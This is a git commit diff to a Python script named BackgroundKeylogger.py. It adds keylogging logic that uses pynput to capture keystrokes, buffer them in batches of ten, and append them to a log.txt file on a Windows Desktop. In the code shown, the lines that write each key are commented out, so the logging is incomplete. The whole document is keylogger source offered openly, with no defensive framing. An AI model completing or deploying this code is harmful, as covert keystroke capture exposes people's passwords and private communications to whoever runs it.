7bdddfd8e06bfad6a16697d4ac9b6efc8fda36f1
ChrAdrian <chr.adrian@yahoo.com>
2021-11-09 18:19:04 +0200

    + keylogger

--- BackgroundKeylogger.py
+++ BackgroundKeylogger.py
@@ -3,10 +3,38 @@
 
 
 from pynput.keyboard import Key, Listener
+import os
+
+
+count = 0
+keys = []
 
 
 def key_press(key):
-    print("{0} pressed".format(key))
+    global count, keys
+
+    keys.append(key)
+    count += 1
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    os.chdir(r"C:\Users\Me\Desktop")
+    with open("log.txt", "a") as f:
+        nr_of_keys = 0
+        for key in keys:
+            k = str(key).replace("'", "")
+            nr_of_keys += 1
+            # if nr_of_keys == 50:
+            #     f.write("\n")
+            #     nr_of_keys = 0
+            # elif k.find("Key") == -1:
+            #     f.write(k)
+
 
 def key_release(key):
     if key == Key.esc:
